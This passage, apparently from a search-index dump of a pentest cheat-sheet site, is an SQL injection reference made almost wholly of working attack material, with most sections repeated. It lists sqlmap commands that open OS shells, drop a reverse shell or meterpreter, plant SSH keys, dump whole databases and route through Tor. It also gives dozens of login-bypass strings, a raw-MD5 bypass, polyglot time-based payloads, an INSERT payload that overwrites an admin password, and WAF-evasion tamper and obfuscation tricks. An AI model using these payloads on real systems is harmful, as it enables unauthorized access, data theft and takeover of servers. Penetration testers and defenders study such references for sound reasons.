,\"MSSQL\"], [\"@@CONNECTIONS=@@CONNECTIONS\" ,\"MSSQL\"], [\"@@CPU_BUSY=@@CPU_BUSY\" ,\"MSSQL\"], [\"USER_ID(1)=USER_ID(1)\" ,\"MSSQL\"], [\"ROWNUM=ROWNUM\" ,\"ORACLE\"], [\"RAWTOHEX('AB')=RAWTOHEX('AB')\" ,\"ORACLE\"], [\"LNNVL(0=123)\" ,\"ORACLE\"], [\"5::int=5\" ,\"POSTGRESQL\"], [\"5::integer=5\" ,\"POSTGRESQL\"], [\"pg_client_encoding()=pg_client_encoding()\" ,\"POSTGRESQL\"], [\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"], [\"quote_literal(42.5)=quote_literal(42.5)\" ,\"POSTGRESQL\"], [\"current_database()=current_database()\" ,\"POSTGRESQL\"], [\"sqlite_version()=sqlite_version()\" ,\"SQLITE\"], [\"last_insert_rowid()>1\" ,\"SQLITE\"], [\"last_insert_rowid()=last_insert_rowid()\" ,\"SQLITE\"], [\"val(cvar(1))=1\" ,\"MSACCESS\"], [\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\" ,\"MSACCESS\"], [\"cdbl(1)=cdbl(1)\" ,\"MSACCESS\"], [\"1337=1337\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], [\"'i'='i'\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], SQL injection using SQLmap Basic arguments for SQLmap sqlmap --url=\"<url>\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs Load a request file and use mobile user-agent sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1 Custom injection in UserAgent/Header/Referer/Cookie python sqlmap.py -u \"http://example.com\" --data \"username=admin&password=pass\" --headers=\"x-forwarded-for:127.0.0.1*\" The injection is located at the '*' Second order injection python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3 sqlmap -r 1.txt -dbms MySQL -second-order \"http://<IP/domain>/joomla/administrator/index.php\" -D \"joomla\" -dbs Shell SQL Shell python sqlmap.py -u \"http://example.com/?id=1\" -p id --sql-shell Simple Shell python sqlmap.py -u \"http://example.com/?id=1\" -p id --os-shell Dropping a reverse-shell / meterpreter python sqlmap.py -u \"http://example.com/?id=1\" -p id --os-pwn SSH Shell by dropping an SSH key python sqlmap.py -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/ Crawl a website with SQLmap and auto-exploit sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers --crawl = how deep you want to crawl a site --forms = Parse and test forms Using TOR with SQLmap sqlmap -u \"http://www.target.com\" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5 Using a proxy with SQLmap sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\" Using Chrome cookie and a Proxy sqlmap -u \"https://test.com/index.php?id=99\" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy \"http://127.0.0.1:8080\" -f --time-sec 15 --level 3 Using suffix to tamper the injection python sqlmap.py -u \"http://example.com/?id=1\" -p id --suffix=\"-- \" General tamper option and tamper's list tamper=name_of_the_tamper Tamper Description 0x2char.py Replaces each (MySQL) 0x encoded string with equivalent CONCAT(CHAR(),\u2026) counterpart apostrophemask.py Replaces apostrophe character with its UTF-8 full width counterpart apostrophenullencode.py Replaces apostrophe character with its illegal double unicode counterpart appendnullbyte.py Appends encoded NULL byte character at the end of payload base64encode.py Base64 all characters in a given payload between.py Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' bluecoat.py Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator chardoubleencode.py Double url-encodes all characters in a given payload (not processing already encoded) charencode.py URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) charunicodeencode.py Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) charunicodeescape.py Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) commalesslimit.py Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' commalessmid.py Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' commentbeforeparentheses.py Prepends (inline) comment before parentheses (e.g. ( -> /**/() concat2concatws.py Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' charencode.py Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) equaltolike.py Replaces all occurrences of operator equal ('=') with operator 'LIKE' escapequotes.py Slash escape quotes (' and \") greatest.py Replaces greater than operator ('>') with 'GREATEST' counterpart halfversionedmorekeywords.py Adds versioned MySQL comment before each keyword htmlencode.py HTML encode (using code points) all non-alphanumeric characters (e.g. \u2018 -> ') ifnull2casewhenisnull.py Replaces instances like \u2018IFNULL(A, B)\u2019 with \u2018CASE WHEN ISNULL(A) THEN (B) ELSE (A) END\u2019 counterpart ifnull2ifisnull.py Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' informationschemacomment.py Add an inline comment (/**/) to the end of all occurrences of (MySQL) \u201cinformation_schema\u201d identifier least.py Replaces greater than operator (\u2018>\u2019) with \u2018LEAST\u2019 counterpart lowercase.py Replaces each keyword character with lower case value (e.g. SELECT -> select) modsecurityversioned.py Embraces complete query with versioned comment modsecurityzeroversioned.py Embraces complete query with zero-versioned comment multiplespaces.py Adds multiple spaces around SQL keywords nonrecursivereplacement.py Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters overlongutf8.py Converts all characters in a given payload (not processing already encoded) overlongutf8more.py Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) percentage.py Adds a percentage sign ('%') infront of each character plus2concat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) function CONCAT() counterpart plus2fnconcat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) ODBC function {fn CONCAT()} counterpart randomcase.py Replaces each keyword character with random case value randomcomments.py Add random comments to SQL keywords securesphere.py Appends special crafted string sp_password.py Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs space2comment.py Replaces space character (' ') with comments space2dash.py Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') space2hash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2morehash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2mssqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mssqlhash.py Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') space2mysqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mysqldash.py Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') space2plus.py Replaces space character (' ') with plus ('+') space2randomblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters symboliclogical.py Replaces AND and OR logical operators with their symbolic counterparts (&& and unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT unmagicquotes.py Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) uppercase.py Replaces each keyword character with upper case value 'INSERT' varnish.py Append a HTTP header 'X-originating-IP' versionedkeywords.py Encloses each non-function keyword with versioned MySQL comment versionedmorekeywords.py Encloses each keyword with versioned MySQL comment xforwardedfor.py Append a fake HTTP header 'X-Forwarded-For' SQLmap without SQL injection You can use SQLmap to access a database via its port instead of a URL. sqlmap.py -d \"mysql://user:pass@ip/database\" --dump-all Authentication bypass '-' ' ' '&' '^' '*' ' or 1=1 limit 1 -- -+ '=\"or' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' '-||0' \"-||0\" \"-\" \" \" \"&\" \"^\" \"*\" '--' \"--\" '--' / \"--\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or (\"x\")=(\"x \")) or ((\"x\"))=((\"x or 2 like 2 or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' -- - admin' # admin'/* admin' or '2' LIKE '1 admin' or 2 LIKE 2-- admin' or 2 LIKE 2# admin') or 2 LIKE 2# admin') or 2 LIKE 2-- admin') or ('2' LIKE '2 admin') or ('2' LIKE '2'# admin') or ('2' LIKE '2'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 admin\" -- admin';-- azer admin\" # admin\"/* admin\" or \"1\"=\"1 admin\" or \"1\"=\"1\"-- admin\" or \"1\"=\"1\"# admin\" or \"1\"=\"1\"/* admin\"or 1=1 or \"\"=\" admin\" or 1=1 admin\" or 1=1-- admin\" or 1=1# admin\" or 1=1/* admin\") or (\"1\"=\"1 admin\") or (\"1\"=\"1\"-- admin\") or (\"1\"=\"1\"# admin\") or (\"1\"=\"1\"/* admin\") or \"1\"=\"1 admin\") or \"1\"=\"1\"-- admin\") or \"1\"=\"1\"# admin\") or \"1\"=\"1\"/* 1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055 Authentication Bypass (Raw MD5 SHA1) When a raw md5 is used, the pass will be queried as a simple string, not a hexstring. \"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\" Allowing an attacker to craft a string with a true statement such as ' or 'SOMETHING md5(\"ffifdyop\", true) = 'or'6\ufffd]\ufffd\ufffd!r,\ufffd\ufffdb\u001c sha1(\"3fDf \", true) = Q\ufffdu'='\ufffd@\ufffd[\ufffdt\ufffd- o\ufffd\ufffd_-! Challenge demo available at http://web.jarvisoj.com:32772 Polyglot injection (multicontext) SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/ /* MySQL only */ IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ Routed injection admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055' Insert Statement - ON DUPLICATE KEY UPDATE ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by: Inject using payload: attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- The query would look like this: INSERT INTO users (email, password) VALUES (\"attacker_dummy@example.com\", \"bcrypt_hash_of_qwerty\"), (\"admin@example.com\", \"bcrypt_hash_of_qwerty\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_qwerty\" -- \", \"bcrypt_hash_of_your_password_input\"); This query will insert a row for the user \u201cattacker_dummy@example.com\u201d. It will also insert a row for the user \u201cadmin@example.com\u201d. Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to \"bcrypt_hash_of_qwerty\". After this, we can simply authenticate with \u201cadmin@example.com\u201d and the password \u201cqwerty\u201d! WAF Bypass White spaces alternatives No Space (%20) - bypass using whitespace alternatives ?id=1%09and%091=1%09-- ?id=1%0Dand%0D1=1%0D-- ?id=1%0Cand%0C1=1%0C-- ?id=1%0Band%0B1=1%0B-- ?id=1%0Aand%0A1=1%0A-- ?id=1%A0and%A01=1%A0-- No Whitespace - bypass using comments ?id=1/*comment*/and/**/1=1/**/-- No Whitespace - bypass using parenthesis ?id=(1)and(1)=(1)-- Whitespace alternatives by DBMS | DBMS | ASCII characters in hexadicimal | | ---- | ------------------------------- | | SQLite3 | 0A, 0D, 0C, 09, 20 | | MySQL 5 | 09, 0A, 0B, 0C, 0D, A0, 20 | | MySQL 3 | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 | | PostgreSQL | 0A, 0D, 0C, 09, 20 | | Oracle 11g | 00, 0A, 0D, 0C, 09, 20 | | MSSQL | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 | Example of query where spaces were replaced by ascii characters above 0x80 \u2640SELECT\u00a7*\u2302FROM\u263ausers\u266bWHERE\u26421\u263c=\u00b61\u203c No Comma Bypass using OFFSET, FROM and JOIN LIMIT 0,1 -> LIMIT 1 OFFSET 0 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1). SELECT 1,2,3,4 -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d No Equal Bypass using LIKE/NOT IN/IN/BETWEEN ?id=1 and substring(version(),1,1)like(5) ?id=1 and substring(version(),1,1)not in(4,3) ?id=1 and substring(version(),1,1)in(4,3) ?id=1 and substring(version(),1,1) between 3 and 4 Case modification Bypass using uppercase/lowercase (see keyword AND) ?id=1 AND 1=1# ?id=1 AnD 1=1# ?id=1 aNd 1=1# Bypass using keywords case insensitive / Bypass using an equivalent operator AND -> && OR -> || = -> LIKE,REGEXP, BETWEEN, not < and not > > X -> not between 0 and X WHERE -> HAVING Obfuscation by DBMS MySQL 1.UNION SELECT 2 3.2UNION SELECT 2 1e0UNION SELECT 2 SELECT\\N/0.e3UNION SELECT 2 1e1AND-0.0UNION SELECT 2 1/*!12345UNION/*!31337SELECT/*!table_name*/ {ts 1}UNION SELECT.`` 1.e.table_name SELECT $.`` 1.e.table_name SELECT{_ .``1.e.table_name} SELECT LightOS . ``1.e.table_name LightOS SELECT information_schema 1337.e.tables 13.37e.table_name SELECT 1 from information_schema 9.e.table_name MSSQL .1UNION SELECT 2 1.UNION SELECT.2alias 1e0UNION SELECT 2 1e1AND-1=0.0UNION SELECT 2 SELECT 0xUNION SELECT 2 SELECT\\UNION SELECT 2 \\1UNION SELECT 2 SELECT 1FROM[table]WHERE\\1=\\1AND\\1=\\1 SELECT\"table_name\"FROM[information_schema].[tables] Oracle 1FUNION SELECT 2 1DUNION SELECT 2 SELECT 0x7461626c655f6e616d65 FROM all_tab_tables SELECT CHR(116) || CHR(97) || CHR(98) FROM all_tab_tables SELECT%00table_name%00FROM%00all_tab_tables More MySQL specific information_schema.tables alternative select * from mysql.innodb_table_stats; +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ | database_name | table_name | last_update | n_rows | clustered_index_size | sum_of_other_index_sizes | +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ | dvwa | guestbook | 2017-01-19 21:02:57 | 0 | 1 | 0 | | dvwa | users | 2017-01-19 21:03:07 | 5 | 1 | 0 | ... +----------------+-----------------------+---------------------+--------+----------------------+--------------------------+ mysql> show tables in dvwa; +----------------+ | Tables_in_dvwa | +----------------+ | guestbook | | users | +----------------+ Version Alternative mysql> select @@innodb_version; +------------------+ | @@innodb_version | +------------------+ | 5.6.31 | +------------------+ mysql> select @@version; +-------------------------+ | @@version | +-------------------------+ | 5.6.31-0ubuntu0.15.10.1 | +-------------------------+ mysql> mysql> select version(); +-------------------------+ | version() | +-------------------------+ | 5.6.31-0ubuntu0.15.10.1 | +-------------------------+ WAF bypass for MySQL using scientific notation Blocked ' or ''=' Working ' or 1.e('')=' Obfuscated query 1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2 References Detect SQLi Manual SQL Injection Discovery Tips NetSPI SQL Injection Wiki MySQL: PentestMonkey's mySQL injection cheat sheet Reiners mySQL injection Filter Evasion Cheatsheet Alternative for Information_Schema.Tables in MySQL The SQL Injection Knowledge base MSSQL: EvilSQL's Error/Union/Blind MSSQL Cheatsheet PentestMonkey's MSSQL SQLi injection Cheat Sheet ORACLE: PentestMonkey's Oracle SQLi Cheatsheet POSTGRESQL: PentestMonkey's Postgres SQLi Cheatsheet Others SQLi Cheatsheet - NetSparker Access SQLi Cheatsheet PentestMonkey's Ingres SQL Injection Cheat Sheet Pentestmonkey's DB2 SQL Injection Cheat Sheet Pentestmonkey's Informix SQL Injection Cheat Sheet SQLite3 Injection Cheat sheet Ruby on Rails (Active Record) SQL Injection Guide ForkBombers SQLMap Tamper Scripts Update SQLi in INSERT worse than SELECT Manual SQL Injection Tips Second Order: Analyzing CVE-2018-6376 \u2013 Joomla!, Second Order SQL Injection Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper Sqlmap: #SQLmap protip @zh4ck WAF: SQLi Optimization and Obfuscation Techniques by Roberto Salgado A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection","title":"SQL injection"},{"location":"SQL%20Injection/#sql-injection","text":"A SQL injection attack consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. Attempting to manipulate SQL queries may have goals including: - Information Leakage - Disclosure of stored data - Manipulation of stored data - Bypassing authorization controls","title":"SQL injection"},{"location":"SQL%20Injection/#summary","text":"CheatSheet MSSQL Injection CheatSheet MySQL Injection CheatSheet OracleSQL Injection CheatSheet PostgreSQL Injection CheatSheet SQLite Injection CheatSheet Cassandra Injection Entry point detection DBMS Identification SQL injection using SQLmap Basic arguments for SQLmap Load a request file and use mobile user-agent Custom injection in UserAgent/Header/Referer/Cookie Second order injection Shell Crawl a website with SQLmap and auto-exploit Using TOR with SQLmap Using a proxy with SQLmap Using Chrome cookie and a Proxy Using suffix to tamper the injection General tamper option and tamper's list SQLmap without SQL injection Authentication bypass Authentication Bypass (Raw MD5 SHA1) Polyglot injection Routed injection Insert Statement - ON DUPLICATE KEY UPDATE WAF Bypass","title":"Summary"},{"location":"SQL%20Injection/#entry-point-detection","text":"Detection of an SQL injection entry point Simple characters ' %27 \" %22 # %23 ; %3B ) Wildcard (*) &apos; # required for XML content Multiple encoding %%2727 %25%27 Merging characters `+HERP '||'DERP '+'herp ' 'DERP '%20'HERP '%2B'HERP Logic Testing page.asp?id=1 or 1=1 -- true page.asp?id=1' or 1=1 -- true page.asp?id=1\" or 1=1 -- true page.asp?id=1 and 1=2 -- false Weird characters Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (\") Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (')","title":"Entry point detection"},{"location":"SQL%20Injection/#dbms-identification","text":"[\"conv('a',16,2)=conv('a',16,2)\" ,\"MYSQL\"], [\"connection_id()=connection_id()\" ,\"MYSQL\"], [\"crc32('MySQL')=crc32('MySQL')\" ,\"MYSQL\"], [\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\" ,\"MSSQL\"], [\"@@CONNECTIONS>0\" ,\"MSSQL\"], [\"@@CONNECTIONS=@@CONNECTIONS\" ,\"MSSQL\"], [\"@@CPU_BUSY=@@CPU_BUSY\" ,\"MSSQL\"], [\"USER_ID(1)=USER_ID(1)\" ,\"MSSQL\"], [\"ROWNUM=ROWNUM\" ,\"ORACLE\"], [\"RAWTOHEX('AB')=RAWTOHEX('AB')\" ,\"ORACLE\"], [\"LNNVL(0=123)\" ,\"ORACLE\"], [\"5::int=5\" ,\"POSTGRESQL\"], [\"5::integer=5\" ,\"POSTGRESQL\"], [\"pg_client_encoding()=pg_client_encoding()\" ,\"POSTGRESQL\"], [\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"], [\"quote_literal(42.5)=quote_literal(42.5)\" ,\"POSTGRESQL\"], [\"current_database()=current_database()\" ,\"POSTGRESQL\"], [\"sqlite_version()=sqlite_version()\" ,\"SQLITE\"], [\"last_insert_rowid()>1\" ,\"SQLITE\"], [\"last_insert_rowid()=last_insert_rowid()\" ,\"SQLITE\"], [\"val(cvar(1))=1\" ,\"MSACCESS\"], [\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\" ,\"MSACCESS\"], [\"cdbl(1)=cdbl(1)\" ,\"MSACCESS\"], [\"1337=1337\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], [\"'i'='i'\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],","title":"DBMS Identification"},{"location":"SQL%20Injection/#sql-injection-using-sqlmap","text":"","title":"SQL injection using SQLmap"},{"location":"SQL%20Injection/#basic-arguments-for-sqlmap","text":"sqlmap --url=\"<url>\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs","title":"Basic arguments for SQLmap"},{"location":"SQL%20Injection/#load-a-request-file-and-use-mobile-user-agent","text":"sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1","title":"Load a request file and use mobile user-agent"},{"location":"SQL%20Injection/#custom-injection-in-useragentheaderreferercookie","text":"python sqlmap.py -u \"http://example.com\" --data \"username=admin&password=pass\" --headers=\"x-forwarded-for:127.0.0.1*\" The injection is located at the '*'","title":"Custom injection in UserAgent/Header/Referer/Cookie"},{"location":"SQL%20Injection/#second-order-injection","text":"python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3 sqlmap -r 1.txt -dbms MySQL -second-order \"http://<IP/domain>/joomla/administrator/index.php\" -D \"joomla\" -dbs","title":"Second order injection"},{"location":"SQL%20Injection/#shell","text":"SQL Shell python sqlmap.py -u \"http://example.com/?id=1\" -p id --sql-shell Simple Shell python sqlmap.py -u \"http://example.com/?id=1\" -p id --os-shell Dropping a reverse-shell / meterpreter python sqlmap.py -u \"http://example.com/?id=1\" -p id --os-pwn SSH Shell by dropping an SSH key python sqlmap.py -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/","title":"Shell"},{"location":"SQL%20Injection/#crawl-a-website-with-sqlmap-and-auto-exploit","text":"sqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3 --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers --crawl = how deep you want to crawl a site --forms = Parse and test forms","title":"Crawl a website with SQLmap and auto-exploit"},{"location":"SQL%20Injection/#using-tor-with-sqlmap","text":"sqlmap -u \"http://www.target.com\" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5","title":"Using TOR with SQLmap"},{"location":"SQL%20Injection/#using-a-proxy-with-sqlmap","text":"sqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"","title":"Using a proxy with SQLmap"},{"location":"SQL%20Injection/#using-chrome-cookie-and-a-proxy","text":"sqlmap -u \"https://test.com/index.php?id=99\" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy \"http://127.0.0.1:8080\" -f --time-sec 15 --level 3","title":"Using Chrome cookie and a Proxy"},{"location":"SQL%20Injection/#using-suffix-to-tamper-the-injection","text":"python sqlmap.py -u \"http://example.com/?id=1\" -p id --suffix=\"-- \"","title":"Using suffix to tamper the injection"},{"location":"SQL%20Injection/#general-tamper-option-and-tampers-list","text":"tamper=name_of_the_tamper Tamper Description 0x2char.py Replaces each (MySQL) 0x encoded string with equivalent CONCAT(CHAR(),\u2026) counterpart apostrophemask.py Replaces apostrophe character with its UTF-8 full width counterpart apostrophenullencode.py Replaces apostrophe character with its illegal double unicode counterpart appendnullbyte.py Appends encoded NULL byte character at the end of payload base64encode.py Base64 all characters in a given payload between.py Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' bluecoat.py Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator chardoubleencode.py Double url-encodes all characters in a given payload (not processing already encoded) charencode.py URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) charunicodeencode.py Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) charunicodeescape.py Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) commalesslimit.py Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' commalessmid.py Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)' commentbeforeparentheses.py Prepends (inline) comment before parentheses (e.g. ( -> /**/() concat2concatws.py Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)' charencode.py Url-encodes all characters in a given payload (not processing already encoded) charunicodeencode.py Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded) equaltolike.py Replaces all occurrences of operator equal ('=') with operator 'LIKE' escapequotes.py Slash escape quotes (' and \") greatest.py Replaces greater than operator ('>') with 'GREATEST' counterpart halfversionedmorekeywords.py Adds versioned MySQL comment before each keyword htmlencode.py HTML encode (using code points) all non-alphanumeric characters (e.g. \u2018 -> ') ifnull2casewhenisnull.py Replaces instances like \u2018IFNULL(A, B)\u2019 with \u2018CASE WHEN ISNULL(A) THEN (B) ELSE (A) END\u2019 counterpart ifnull2ifisnull.py Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)' informationschemacomment.py Add an inline comment (/**/) to the end of all occurrences of (MySQL) \u201cinformation_schema\u201d identifier least.py Replaces greater than operator (\u2018>\u2019) with \u2018LEAST\u2019 counterpart lowercase.py Replaces each keyword character with lower case value (e.g. SELECT -> select) modsecurityversioned.py Embraces complete query with versioned comment modsecurityzeroversioned.py Embraces complete query with zero-versioned comment multiplespaces.py Adds multiple spaces around SQL keywords nonrecursivereplacement.py Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters overlongutf8.py Converts all characters in a given payload (not processing already encoded) overlongutf8more.py Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) percentage.py Adds a percentage sign ('%') infront of each character plus2concat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) function CONCAT() counterpart plus2fnconcat.py Replaces plus operator (\u2018+\u2019) with (MsSQL) ODBC function {fn CONCAT()} counterpart randomcase.py Replaces each keyword character with random case value randomcomments.py Add random comments to SQL keywords securesphere.py Appends special crafted string sp_password.py Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs space2comment.py Replaces space character (' ') with comments space2dash.py Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') space2hash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2morehash.py Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') space2mssqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mssqlhash.py Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') space2mysqlblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters space2mysqldash.py Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') space2plus.py Replaces space character (' ') with plus ('+') space2randomblank.py Replaces space character (' ') with a random blank character from a valid set of alternate characters symboliclogical.py Replaces AND and OR logical operators with their symbolic counterparts (&& and unionalltounion.py Replaces UNION ALL SELECT with UNION SELECT unmagicquotes.py Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) uppercase.py Replaces each keyword character with upper case value 'INSERT' varnish.py Append a HTTP header 'X-originating-IP' versionedkeywords.py Encloses each non-function keyword with versioned MySQL comment versionedmorekeywords.py Encloses each keyword with versioned MySQL comment xforwardedfor.py Append a fake HTTP header 'X-Forwarded-For'","title":"General tamper option and tamper's list"},{"location":"SQL%20Injection/#sqlmap-without-sql-injection","text":"You can use SQLmap to access a database via its port instead of a URL. sqlmap.py -d \"mysql://user:pass@ip/database\" --dump-all","title":"SQLmap without SQL injection"},{"location":"SQL%20Injection/#authentication-bypass","text":"'-' ' ' '&' '^' '*' ' or 1=1 limit 1 -- -+ '=\"or' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' '-||0' \"-||0\" \"-\" \" \" \"&\" \"^\" \"*\" '--' \"--\" '--' / \"--\" \" or \"\"-\" \" or \"\" \" \" or \"\"&\" \" or \"\"^\" \" or \"\"*\" or true-- \" or true-- ' or true-- \") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x \" or \"x\"=\"x \") or 